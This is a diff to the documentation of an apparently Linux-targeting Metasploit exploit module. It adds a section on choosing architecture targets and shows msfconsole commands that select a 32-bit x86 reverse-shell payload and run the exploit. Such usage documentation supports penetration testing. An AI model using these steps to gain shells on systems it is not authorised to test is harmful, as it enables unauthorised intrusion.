@@ -64,6 +64,30 @@ msf6 exploit(...) > set LPORT 4444
 msf6 exploit(...) > run
 ```
 
+### Targets
+
+You can manually force a specific architecture if the auto-detection (`uname -m`) fails or if you are targeting a specific environment.
+
+```
+msf6 exploit(...) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Auto (CopyFail-Go)
+   1   Linux x64
+   2   Linux x86
+   3   Linux aarch64
+   4   Linux armle
+```
+
+To force a 32-bit x86 payload and binary:
+```
+msf6 exploit(...) > set TARGET 2
+msf6 exploit(...) > set PAYLOAD linux/x86/shell/reverse_tcp
+```
+
 ### Module Options
 
 | Option | Type | Default | Description |
